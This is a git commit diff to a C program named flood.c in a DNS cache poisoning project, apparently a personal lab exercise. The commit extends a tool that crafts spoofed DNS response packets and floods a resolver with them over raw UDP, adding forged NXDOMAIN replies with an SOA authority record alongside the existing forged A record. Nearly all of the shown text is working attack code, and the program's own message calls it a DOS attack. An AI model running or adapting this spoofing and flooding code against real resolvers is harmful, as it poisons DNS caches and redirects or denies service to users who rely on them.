cee188ef8525e0a74a3084100bc0ca032d9f44b4
Elias Lundell <elilun03@gmail.com>
2025-10-18 14:12:34 +0200

    Answer with NXDOMAIN to answer authority section

--- dns_cache_poisoning/attack/flood.c
+++ dns_cache_poisoning/attack/flood.c
@@ -7,6 +7,7 @@
 #include <unistd.h>
 #include <linux/ip.h>
 #include <linux/udp.h>
+#include <stdbool.h>
 
 #define PACKET_LENGTH 8192
 
@@ -46,7 +47,7 @@ struct DNSQuestion {
     uint16_t qclass;
 } __attribute__((packed));
 
-struct DNSAnswer {
+struct DNSAnswerA {
     uint16_t name;   // pointer to the name in question section
     uint16_t type;
     uint16_t class;
@@ -54,6 +55,24 @@ struct DNSAnswer {
     uint16_t rdlength;
     uint32_t rdata; // specifically 32-bit for A record, see https://datatracker.ietf.org/doc/html/rfc1035#section-3.4.1
 } __attribute__((packed));
+
+struct DNSAnswer {
+    uint16_t name;   // pointer to the name in question section
+    uint16_t type;
+    uint16_t class;
+    uint32_t ttl;
+    uint16_t rdlength;
+    // rdata
+} __attribute__((packed));
+
+// SOA https://datatracker.ietf.org/doc/html/rfc1035#section-3.3.13
+// MNAME
+// RNAME
+// SERIAL 32bit
+// REFRESH 32bit
+// RETRY 32bit
+// EXPIRE 32bit
+// MINIMUM 32bit
 
 void encode_domain_name(const char *domain, unsigned char *buffer) {
     const char *pos = domain;
@@ -75,7 +94,7 @@ void encode_domain_name(const char *domain, unsigned char *buffer) {
     buffer[pos - domain + 1] = 0; // terminate with 0
 }
 
-void generate_packet(unsigned char *packet, int packet_max_size, int *packet_size, const char *fidget_domain) {
+void generate_packet(unsigned char *packet, int packet_max_size, int *packet_size, const char *fidget_domain, int main_domain_offset, bool nxdomain) {
     memset(packet, 0, packet_max_size);
 
     // DNS header
@@ -97,11 +116,11 @@ void generate_packet(unsigned char *packet, int packet_max_size, int *packet_siz
         0 << 6 |  // Z = 0 (reserved)
         0 << 5 |  // Answer authenticated = 0 (from Wireshark, not RCF1035, probably later addition)
         1 << 4 |  // Non-authenticated data: Acceptable (also from Wireshark)
-        0 << 0;   // Rcode = 0 (no error)
+        (nxdomain ? 3 : 0) << 0;   // Rcode = 0 (no error) or 3 (NXDOMAIN)
     dns->flags = htons(flags);        // standard query response, no error
     dns->qdcount = htons(1);           // 1 question
-    dns->ancount = htons(1);           // 1 answer
-    dns->nscount = htons(0);           // 1 authority records (nameserver count) (to overwrite the cached nameserver)
+    dns->ancount = htons((nxdomain ? 0 : 1));           // 1 answer
+    dns->nscount = htons((nxdomain ? 1 : 0));           // 1 authority records (nameserver count) (to overwrite the cached nameserver)
     dns->arcount = htons(0);           // 0 additional records
 
     // Question section
@@ -112,18 +131,45 @@ void generate_packet(unsigned char *packet, int packet_max_size, int *packet_siz
     question->qtype = htons(1);    // A record
     question->qclass = htons(1);   // IN
 
-    // Answer section
-    // See https://datatracker.ietf.org/doc/html/rfc1035#section-4.1.3
-    struct DNSAnswer *answer = (struct DNSAnswer *)((unsigned char *)question + sizeof(struct DNSQuestion));
-    answer->name = htons(0xC00C);  // Pointer to offset 12 bytes (start of qname in dns query). See https://datatracker.ietf.org/doc/html/rfc1035#section-4.1.4
-    answer->type = htons(1);       // A record
-    answer->class = htons(1);      // IN
-    answer->ttl = htonl(3600);     // TTL 1 hour
-    answer->rdlength = htons(4);   // IPv4 address length
-    answer->rdata = inet_addr("192.168.128.128"); // Spoofed IP adderss
+    struct DNSAnswerA *answer = (struct DNSAnswerA *)((unsigned char *)question + sizeof(struct DNSQuestion));
+    struct DNSAnswer *soa = (struct DNSAnswer *)((nxdomain ? (unsigned char *)question + sizeof(struct DNSQuestion) : (unsigned char *)(answer) + sizeof(struct DNSAnswerA)));
+    if (!nxdomain) {
+        // Answer section
+        // See https://datatracker.ietf.org/doc/html/rfc1035#section-4.1.3
+        answer->name = htons(0xC00C);  // Pointer to offset 12 bytes (start of qname in dns query). See https://datatracker.ietf.org/doc/html/rfc1035#section-4.1.4
+        answer->type = htons(1);       // A record
+        answer->class = htons(1);      // IN
+        answer->ttl = htonl(3600);     // TTL 1 hour
+        answer->rdlength = htons(4);   // IPv4 address length
+        answer->rdata = inet_addr("192.168.128.128"); // Spoofed IP adderss
+    } else {
+        soa->name = htons(0xC00C + main_domain_offset); // Pointer to offset 12 + offset (ie 14 for X.eliaslundell.se e.g.)
+        soa->type = htons(6);       // SOA record
+        soa->class = htons(1);      // IN
+        soa->ttl = htonl(3600);     // TTL 1 hour
+
+        void* soa_rdata = (void*)soa + sizeof(struct DNSAnswer);
+        void* soa_rdata_start = soa_rdata;
+        const char *ns_domain = "ns.test.com";
+        encode_domain_name(ns_domain, (unsigned char*)soa_rdata);
+        soa_rdata += strlen((char*)soa_rdata) + 1;
+
+        const char* mname_domain = "dns.test.com";
+        encode_domain_name(mname_domain, (unsigned char*)soa_rdata);
+        soa_rdata += strlen((char*)soa_rdata) + 1;
+
+        *(uint32_t*)(soa_rdata)      = htonl(2386141192); // Serial
+        *(uint32_t*)(soa_rdata + 4)  = htonl(10000); // Refresh
+        *(uint32_t*)(soa_rdata + 8)  = htonl(2400); // Retry
+        *(uint32_t*)(soa_rdata + 12) = htonl(604800); // Expire
+        *(uint32_t*)(soa_rdata + 16) = htonl(1800); // Minimum
+                                                    
+        soa->rdlength = htons(soa_rdata + 20 - soa_rdata_start);   // SOA record length
+    }
 
     *packet_size = sizeof(struct DNSHeader) + (strlen((char *)fidget_qname) + 1) +
-                   sizeof(struct DNSQuestion) + sizeof(struct DNSAnswer);
+                   sizeof(struct DNSQuestion) + (nxdomain ? 0 : sizeof(struct DNSAnswerA)) + 
+                   (nxdomain ? sizeof(struct DNSAnswer) + ntohs(soa->rdlength) : 0);
 }
 
 void change_transaction_id(unsigned char *packet, uint16_t new_id) {
@@ -144,9 +190,9 @@ unsigned short csum(unsigned short *buf, int nwords)
 
 int flood(int argc, char *argv[]) {
     printf("IMPORTANT: This will flood with UDP pcakets and therefore perform a DOS attack. Use with caution and follow all rules and laws when using!\n");
-    if (argc != 6) {
-        printf("Usage: %s <spoofed_ip> <spoofed_port> <dns_server_ip> <dns_server_request_post> <fidget_domain>\n", argv[0]);
-        printf("Example: %s 1.1.1.1 53 172.18.0.2 33333 XX.eliaslundell.se\n", argv[0]);
+    if (argc != 8) {
+        printf("Usage: %s <spoofed_ip> <spoofed_port> <dns_server_ip> <dns_server_request_post> <fidget_domain> <main_domain_offset> <nxdomain>\n", argv[0]);
+        printf("Example: %s 1.1.1.1 53 172.18.0.2 33333 XX.eliaslundell.se 3 1\n", argv[0]);
         return 1;
     }
 
@@ -155,10 +201,13 @@ int flood(int argc, char *argv[]) {
     u_int32_t dst_addr = inet_addr(argv[3]);
     u_int16_t dst_port = atoi(argv[4]);
 
+    int main_domain_offset = atoi(argv[6]);
+    bool nxdomain = atoi(argv[7]);
+
     unsigned char packet[512];
     int packet_size;
 
-    generate_packet(packet, 512, &packet_size, argv[5]);
+    generate_packet(packet, 512, &packet_size, argv[5], main_domain_offset, nxdomain);
 
     printf("DNS response packet generated (%d bytes):\n", packet_size);
     wireshark_hexdump(packet, packet_size, 10);
